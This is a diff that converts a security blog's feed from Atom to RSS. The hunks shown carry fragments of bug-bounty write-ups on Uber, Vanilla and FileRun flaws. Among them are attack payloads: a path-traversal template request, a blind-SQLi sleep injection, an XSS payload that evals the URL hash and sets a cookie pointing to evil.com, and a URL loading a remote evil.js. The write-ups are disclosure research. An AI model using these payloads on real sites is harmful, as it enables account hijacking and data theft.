@@ -1,4 +1,14 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-12-04T17:51:40+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Symbo1</title><entry><title type="html">Hijack the JS File of Uber’s Website</title><link href="http://localhost:4000/articles/2018/12/03/hijack-jsfile-of-uber.html" rel="alternate" type="text/html" title="Hijack the JS File of Uber's Website" /><published>2018-12-03T00:00:00+08:00</published><updated>2018-12-03T00:00:00+08:00</updated><id>http://localhost:4000/articles/2018/12/03/hijack-jsfile-of-uber</id><content type="html" xml:base="http://localhost:4000/articles/2018/12/03/hijack-jsfile-of-uber.html">&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;03 Dec 2018 - zhchbin&lt;/p&gt;
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+<title>Symbo1</title>
+<description></description>  
+<link>http://localhost:4000</link>
+<atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
+
+<item>
+<title>Hijack the JS File of Uber's Website</title>
+<description>&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;03 Dec 2018 - zhchbin&lt;/p&gt;
 
 &lt;p&gt;   Again, sorry for my poor English first of all, and I will try my best to describe this bug bounty report throughly.&lt;/p&gt;
 
@@ -52,7 +62,17 @@
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;urest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;legacy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;saveTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;utk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;688&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;b137d1b8d8e884b3e1be4cd689843d0e3bc9705665f059b&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
 
-&lt;span class=&quot;nx&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;evilaccount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;revision&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;revision&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;thisisatest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;revision&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;201804081230&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;victimaccount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/templates/m&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ain&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;</content><author><name></name></author><summary type="html">03 Dec 2018 - zhchbin</summary></entry><entry><title type="html">bug bounty writeup - xss in url path</title><link href="http://localhost:4000/articles/2018/10/08/xss-in-url-path.html" rel="alternate" type="text/html" title="bug bounty writeup - xss in url path" /><published>2018-10-08T00:00:00+08:00</published><updated>2018-10-08T00:00:00+08:00</updated><id>http://localhost:4000/articles/2018/10/08/xss-in-url-path</id><content type="html" xml:base="http://localhost:4000/articles/2018/10/08/xss-in-url-path.html">&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;08 Oct 2018 - L3m0n&lt;/p&gt;
+&lt;span class=&quot;nx&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;evilaccount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;revision&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;revision&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;thisisatest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;revision&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;201804081230&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;victimaccount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/templates/m&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ain&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+</description>
+<pubDate>Mon, 03 Dec 2018 00:00:00 +0800</pubDate>
+<link>http://localhost:4000/articles/2018/12/03/hijack-jsfile-of-uber.html</link>
+<guid isPermaLink="true">http://localhost:4000/articles/2018/12/03/hijack-jsfile-of-uber.html</guid>
+</item>
+
+<item>
+<title>bug bounty writeup - xss in url path</title>
+<description>&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;08 Oct 2018 - L3m0n&lt;/p&gt;
 
 &lt;p&gt;漏洞点: http://lemon.i/test/xss/13.php/i_am_xss_point/i_am_xss_point/&lt;/p&gt;
 
@@ -127,7 +147,16 @@
 &lt;h2 id=&quot;referer&quot;&gt;Referer&lt;/h2&gt;
 
 &lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://hackerone.com/reports/311467&quot;&gt;Reflected XSS in the IE 11 / Edge&lt;/a&gt;&lt;br /&gt;
-&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/masatokinugawa/filterbypass/wiki/Browser%27s-XSS-Filter-Bypass-Cheat-Sheet&quot;&gt;Browser’s XSS Filter Bypass Cheat Sheet&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">08 Oct 2018 - L3m0n</summary></entry><entry><title type="html">Vanilla SQL Injection Vulnerability</title><link href="http://localhost:4000/articles/2018/10/02/vanilla-sql-injection.html" rel="alternate" type="text/html" title="Vanilla SQL Injection Vulnerability" /><published>2018-10-02T00:00:00+08:00</published><updated>2018-10-02T00:00:00+08:00</updated><id>http://localhost:4000/articles/2018/10/02/vanilla-sql-injection</id><content type="html" xml:base="http://localhost:4000/articles/2018/10/02/vanilla-sql-injection.html">&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;02 Oct 2018 - Balis0ng&lt;/p&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/masatokinugawa/filterbypass/wiki/Browser%27s-XSS-Filter-Bypass-Cheat-Sheet&quot;&gt;Browser’s XSS Filter Bypass Cheat Sheet&lt;/a&gt;&lt;/p&gt;
+</description>
+<pubDate>Mon, 08 Oct 2018 00:00:00 +0800</pubDate>
+<link>http://localhost:4000/articles/2018/10/08/xss-in-url-path.html</link>
+<guid isPermaLink="true">http://localhost:4000/articles/2018/10/08/xss-in-url-path.html</guid>
+</item>
+
+<item>
+<title>Vanilla SQL Injection Vulnerability</title>
+<description>&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;02 Oct 2018 - Balis0ng&lt;/p&gt;
 
 &lt;h2 id=&quot;简介&quot;&gt;简介&lt;/h2&gt;
 
@@ -295,7 +324,16 @@ TransientKey=caEyM0dSVZC0xDhU&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&g
 
 &lt;p&gt;   其实这种漏洞很常见，很多程序在处理SQL语句的时候，都采用的这种写法，当然这种写法是没错的。主要还是因为开发人员太信任外部的输入了。&lt;/p&gt;
 
-&lt;p&gt;该程序在该版本相同类型的漏洞还有一个，大家有兴趣的话可以自己找一找。(当然我已经提交给厂商啦。)&lt;/p&gt;</content><author><name></name></author><summary type="html">02 Oct 2018 - Balis0ng</summary></entry><entry><title type="html">Abusing CORS via null origin</title><link href="http://localhost:4000/articles/2018/07/04/abusing-cors-via-null-origin.html" rel="alternate" type="text/html" title="Abusing CORS via null origin" /><published>2018-07-04T00:00:00+08:00</published><updated>2018-07-04T00:00:00+08:00</updated><id>http://localhost:4000/articles/2018/07/04/abusing-cors-via-null-origin</id><content type="html" xml:base="http://localhost:4000/articles/2018/07/04/abusing-cors-via-null-origin.html">&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;04 Jul 2018 - onehackzero&lt;/p&gt;
+&lt;p&gt;该程序在该版本相同类型的漏洞还有一个，大家有兴趣的话可以自己找一找。(当然我已经提交给厂商啦。)&lt;/p&gt;
+</description>
+<pubDate>Tue, 02 Oct 2018 00:00:00 +0800</pubDate>
+<link>http://localhost:4000/articles/2018/10/02/vanilla-sql-injection.html</link>
+<guid isPermaLink="true">http://localhost:4000/articles/2018/10/02/vanilla-sql-injection.html</guid>
+</item>
+
+<item>
+<title>Abusing CORS via null origin</title>
+<description>&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;04 Jul 2018 - onehackzero&lt;/p&gt;
 
 &lt;h2 id=&quot;poc&quot;&gt;POC:&lt;/h2&gt;
 
@@ -324,7 +362,16 @@ TransientKey=caEyM0dSVZC0xDhU&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&g
 &lt;a href=&quot;https://web-in-security.blogspot.com/2017/07/cors-misconfigurations-on-large-scale.html&quot; target=&quot;_blank&quot;&gt;CORS misconfigurations on a large scale&lt;/a&gt;&lt;br /&gt;
 &lt;a href=&quot;https://yassineaboukir.com/blog/cors-exploitation-data-exfiltration-when-allowed-origin-is-set-to-null/&quot; target=&quot;_blank&quot;&gt;CORS Exploitation: Data exfiltration when allowed origin is set to NULL&lt;/a&gt;&lt;br /&gt;
 &lt;a href=&quot;https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/&quot; target=&quot;_blank&quot;&gt;CORS Misconfigurations Explained&lt;/a&gt;&lt;br /&gt;
-&lt;a href=&quot;https://www.sxcurity.pro/advanced-cors-techniques/&quot; target=&quot;_blank&quot;&gt;Advanced CORS Exploitation Techniques&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">04 Jul 2018 - onehackzero</summary></entry><entry><title type="html">Cracked HackerOne Hidden Bounty Amount</title><link href="http://localhost:4000/articles/2018/05/16/cracked-h1-hidden-bounty-amount.html" rel="alternate" type="text/html" title="Cracked HackerOne Hidden Bounty Amount" /><published>2018-05-16T00:00:00+08:00</published><updated>2018-05-16T00:00:00+08:00</updated><id>http://localhost:4000/articles/2018/05/16/cracked-h1-hidden-bounty-amount</id><content type="html" xml:base="http://localhost:4000/articles/2018/05/16/cracked-h1-hidden-bounty-amount.html">&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;16 May 2018 - CongRong&lt;/p&gt;
+&lt;a href=&quot;https://www.sxcurity.pro/advanced-cors-techniques/&quot; target=&quot;_blank&quot;&gt;Advanced CORS Exploitation Techniques&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
+</description>
+<pubDate>Wed, 04 Jul 2018 00:00:00 +0800</pubDate>
+<link>http://localhost:4000/articles/2018/07/04/abusing-cors-via-null-origin.html</link>
+<guid isPermaLink="true">http://localhost:4000/articles/2018/07/04/abusing-cors-via-null-origin.html</guid>
+</item>
+
+<item>
+<title>Cracked HackerOne Hidden Bounty Amount</title>
+<description>&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;16 May 2018 - CongRong&lt;/p&gt;
 
 &lt;h2 id=&quot;poc&quot;&gt;POC:&lt;/h2&gt;
 
@@ -451,7 +498,16 @@ TransientKey=caEyM0dSVZC0xDhU&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&g
 
 &lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/378eahxk.png&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/21uemnb.png&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">16 May 2018 - CongRong</summary></entry><entry><title type="html">FileRun &amp;lt;= 2017.09.25 Blind SQLi</title><link href="http://localhost:4000/articles/2017/12/18/filerun-blind-sqli.html" rel="alternate" type="text/html" title="FileRun &lt;= 2017.09.25 Blind SQLi" /><published>2017-12-18T00:00:00+08:00</published><updated>2017-12-18T00:00:00+08:00</updated><id>http://localhost:4000/articles/2017/12/18/filerun-blind-sqli</id><content type="html" xml:base="http://localhost:4000/articles/2017/12/18/filerun-blind-sqli.html">&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;18 Dec 2017 - scanf&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/21uemnb.png&quot; /&gt;&lt;/p&gt;
+</description>
+<pubDate>Wed, 16 May 2018 00:00:00 +0800</pubDate>
+<link>http://localhost:4000/articles/2018/05/16/cracked-h1-hidden-bounty-amount.html</link>
+<guid isPermaLink="true">http://localhost:4000/articles/2018/05/16/cracked-h1-hidden-bounty-amount.html</guid>
+</item>
+
+<item>
+<title>FileRun <= 2017.09.25 Blind SQLi</title>
+<description>&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;18 Dec 2017 - scanf&lt;/p&gt;
 
 &lt;h2 id=&quot;0x00-preface&quot;&gt;0x00 Preface&lt;/h2&gt;
 
@@ -587,7 +643,16 @@ limit=50&amp;amp;search=aaa'xor(sleep(2))or'&lt;/span&gt;&lt;/code&gt;&lt;/pre&g
 &lt;p&gt;cve information：&lt;/p&gt;
 
 &lt;p&gt;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7734
-http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7735&lt;/p&gt;</content><author><name></name></author><summary type="html">18 Dec 2017 - scanf</summary></entry><entry><title type="html">Uber XSS via Cookie</title><link href="http://localhost:4000/articles/2017/08/30/uber-cookie-xss.html" rel="alternate" type="text/html" title="Uber XSS via Cookie" /><published>2017-08-30T00:00:00+08:00</published><updated>2017-08-30T00:00:00+08:00</updated><id>http://localhost:4000/articles/2017/08/30/uber-cookie-xss</id><content type="html" xml:base="http://localhost:4000/articles/2017/08/30/uber-cookie-xss.html">&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;30 Aug 2017 - zhchbin&lt;/p&gt;
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7735&lt;/p&gt;
+</description>
+<pubDate>Mon, 18 Dec 2017 00:00:00 +0800</pubDate>
+<link>http://localhost:4000/articles/2017/12/18/filerun-blind-sqli.html</link>
+<guid isPermaLink="true">http://localhost:4000/articles/2017/12/18/filerun-blind-sqli.html</guid>
+</item>
+
+<item>
+<title>Uber XSS via Cookie</title>
+<description>&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;30 Aug 2017 - zhchbin&lt;/p&gt;
 
 &lt;p&gt;   This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.&lt;/p&gt;
 
@@ -656,7 +721,17 @@ http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7735&lt;/p&gt;</content><
 &lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;aaa&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%20type%3d&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%20src%3d1%20o&amp;gt;nerror%3d&quot;&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;decodeURIComponent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
 &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://get.uber.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;Thanks for Uber. Reward: 5k&lt;/p&gt;</content><author><name></name></author><summary type="html">30 Aug 2017 - zhchbin</summary></entry><entry><title type="html">Bypass uber xss regex filter</title><link href="http://localhost:4000/articles/2016/09/10/bypass-uber-xss-filter.html" rel="alternate" type="text/html" title="Bypass uber xss regex filter" /><published>2016-09-10T00:00:00+08:00</published><updated>2016-09-10T00:00:00+08:00</updated><id>http://localhost:4000/articles/2016/09/10/bypass-uber-xss-filter</id><content type="html" xml:base="http://localhost:4000/articles/2016/09/10/bypass-uber-xss-filter.html">&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;10 Sep 2016 - zhchbin&lt;/p&gt;
+&lt;p&gt;Thanks for Uber. Reward: 5k&lt;/p&gt;
+
+</description>
+<pubDate>Wed, 30 Aug 2017 00:00:00 +0800</pubDate>
+<link>http://localhost:4000/articles/2017/08/30/uber-cookie-xss.html</link>
+<guid isPermaLink="true">http://localhost:4000/articles/2017/08/30/uber-cookie-xss.html</guid>
+</item>
+
+<item>
+<title>Bypass uber xss regex filter</title>
+<description>&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;10 Sep 2016 - zhchbin&lt;/p&gt;
 
 &lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
 
@@ -712,7 +787,16 @@ http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7735&lt;/p&gt;</content><
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//www.uber.com/?exp=hp-c&amp;amp;kxsrc=https%3A%2F%2Fwww.akrxd.net%2Fcontroltag%2Fevil.js&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/7184df6bgw1f7otuv4e5hg20sb0k6x6p.gif&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">10 Sep 2016 - zhchbin</summary></entry><entry><title type="html">Osx Apache Code To Disclose</title><link href="http://localhost:4000/articles/2016/06/01/osx-apache-code-disclose.html" rel="alternate" type="text/html" title="Osx Apache Code To Disclose" /><published>2016-06-01T00:00:00+08:00</published><updated>2016-06-01T00:00:00+08:00</updated><id>http://localhost:4000/articles/2016/06/01/osx-apache-code-disclose</id><content type="html" xml:base="http://localhost:4000/articles/2016/06/01/osx-apache-code-disclose.html">&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;01 Jun 2016 - CongRong&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/7184df6bgw1f7otuv4e5hg20sb0k6x6p.gif&quot; /&gt;&lt;/p&gt;
+</description>
+<pubDate>Sat, 10 Sep 2016 00:00:00 +0800</pubDate>
+<link>http://localhost:4000/articles/2016/09/10/bypass-uber-xss-filter.html</link>
+<guid isPermaLink="true">http://localhost:4000/articles/2016/09/10/bypass-uber-xss-filter.html</guid>
+</item>
+
+<item>
+<title>Osx Apache Code To Disclose</title>
+<description>&lt;p align=&quot;right&quot; class=&quot;date&quot;&gt;01 Jun 2016 - CongRong&lt;/p&gt;
 
 &lt;h2 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h2&gt;
 
@@ -855,4 +939,12 @@ http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7735&lt;/p&gt;</content><
 
 &lt;h2 id=&quot;写在最后&quot;&gt;写在最后&lt;/h2&gt;
 
-&lt;p&gt;   虽然第三方包居多，但是想找得更全很难，毕竟是中间件的第三方包，很多站建起来就不好找是不是用这个第三方包搭建的。此漏洞完整的生命线就到这儿了，感兴趣的可以继续研究下补丁。&lt;/p&gt;</content><author><name></name></author><summary type="html">01 Jun 2016 - CongRong</summary></entry></feed>
+&lt;p&gt;   虽然第三方包居多，但是想找得更全很难，毕竟是中间件的第三方包，很多站建起来就不好找是不是用这个第三方包搭建的。此漏洞完整的生命线就到这儿了，感兴趣的可以继续研究下补丁。&lt;/p&gt;
+</description>
+<pubDate>Wed, 01 Jun 2016 00:00:00 +0800</pubDate>
+<link>http://localhost:4000/articles/2016/06/01/osx-apache-code-disclose.html</link>
+<guid isPermaLink="true">http://localhost:4000/articles/2016/06/01/osx-apache-code-disclose.html</guid>
+</item>
+
+</channel>
+</rss>
